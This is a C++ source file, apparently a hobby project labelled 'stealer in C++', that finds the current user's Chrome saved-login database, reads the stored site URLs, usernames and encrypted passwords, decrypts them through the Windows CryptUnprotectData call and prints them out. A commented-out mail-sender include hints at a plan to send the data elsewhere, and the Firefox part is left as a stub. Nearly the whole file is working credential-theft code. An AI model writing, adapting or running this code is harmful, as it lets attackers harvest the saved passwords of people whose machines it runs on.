//============================================================================
// Name        : stealer.cpp
// Author      : Hleb Hatouka
// Description : stealer in C++
//============================================================================
//#include "mailsender.h"
#include <experimental/filesystem>
#include <iostream>
#include <string>
#include <sstream>
#include "sqlite3.h"


#ifdef _WIN32
    #include <windows.h>
    #include <wchar.h>
    #include <conio.h>
    #include <tchar.h>
    #include <Wincrypt.h>
    //#pragma comment(lib, "crypt32.lib")
    //#include <Lmcons.h>

    #ifndef UNICODE  
        typedef std::string String; 
    #else
        typedef std::wstring String; 
    #endif

#endif

namespace fs = std::experimental::filesystem;

int callback1(void *NotUsed, int argc, char **argv, char **azColName);
std::stringstream get_pass(sqlite3* db);

int main()
{
    try
    {
#ifdef __linux__
        std::string chrome_db_path = "~/.config/google-chrome/Default";
        std::string firefox_db_path = "~/.mozilla/firefox/<profilename>";
#else _WIN32
        TCHAR username[255];
        DWORD username_len = 255;
        GetUserName((TCHAR*)username, &username_len);

        String chrome_db_path = _T("C:\\Users\\");
        chrome_db_path += username;
        chrome_db_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");

        String firefox_db_path = _T("C:\\Users\\");
        firefox_db_path += username;
        firefox_db_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
#endif

        if( fs::exists(chrome_db_path))
        {
                //std::cout << "ch exists" << std::endl;
            sqlite3 *db;
            char *zErrMsg = 0;
            int rc;
            std::string sql = "SELECT action_url, username_value, password_value FROM logins";
            rc = sqlite3_open(chrome_db_path.c_str(), &db);
            std::stringstream pass;
            if( rc )
            {
                std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
                sqlite3_close(db);
                return(1);
            }
            pass = get_pass(db);
            std::cout << pass.str();

            //rc = sqlite3_exec(db, sql.c_str(), callback1, 0, &zErrMsg);
        }

        if( fs::exists(firefox_db_path))
        {
            //std::cout << "ff exists" << std::endl;
        }
    }
    catch(...){}

    return 0;
}

int callback1(void *NotUsed, int argc, char **argv, char **azColName)
{
    for(int i = 0; i < argc; i++) 
    {
        std::cout << azColName[i] << ": " << argv[i] << std::endl;
    }
    std::cout << std::endl;
    return 0;
}

std::stringstream get_pass(sqlite3* db)
{
         std::string sql = "SELECT action_url, username_value, password_value FROM logins";
         int rc;
        std::stringstream dump(std::string(""));
            sqlite3_stmt *pStmt;

            rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
            if (rc != SQLITE_OK)
            {
                std::cout << "statement failed rc = " << rc << std::endl;
                return  std::stringstream();
            }
            std::cout << std::endl;

            rc = sqlite3_step(pStmt);
            //std::cout << "RC: " << rc << std::endl;
            while (rc == SQLITE_ROW) 
            {
                dump << sqlite3_column_text(pStmt, 0) << std::endl;
                dump << (char *)sqlite3_column_text(pStmt, 1) << std::endl;

                DATA_BLOB encryptedPass, decryptedPass;

                encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
                encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

                memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

                CryptUnprotectData(
                        &encryptedPass,
                        NULL,
                        NULL,
                        NULL,
                        NULL,
                        0,
                        &decryptedPass);
                char *password = (char *)decryptedPass.pbData;
                while (isprint(*password))
                {
                        dump << *password;
                        password++;
                }
                
                dump << std::endl;
                free(encryptedPass.pbData);
                rc = sqlite3_step(pStmt);
        }
            rc = sqlite3_finalize(pStmt);
            sqlite3_close(db);
            return dump;
}